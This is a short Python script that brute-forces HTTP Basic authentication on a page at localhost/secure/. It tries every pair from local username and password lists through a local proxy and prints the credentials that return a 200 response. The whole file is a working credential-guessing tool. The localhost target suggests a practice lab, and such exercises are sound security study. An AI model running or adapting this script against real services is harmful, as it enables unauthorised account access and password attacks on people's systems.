import requests 
from requests.auth import HTTPBasicAuth
import sys

with open('./users') as f:
    users = f.readlines()
with open('./passwords') as f:
    passwords = f.readlines()

print(f"Loading {len(users)} usernames and {len(passwords)} passwords to brute force")

for user in users:
    for password in passwords:
        print(f"Trying {user.strip()} , {password.strip()}")
        url = 'http://localhost/secure/'
        response = requests.get(url, auth=HTTPBasicAuth(user.strip(), password.strip()), proxies= {"http": "http://127.0.0.1:8080"})
        if response.status_code == 200:
            print(f"Trying {user.strip()} , {password.strip()} => {response.status_code}")
            print()
            print(response.status_code, response.text[:100])
            print(f"Found!!! {user.strip()} , {password.strip()}")
            print()
            sys.exit()
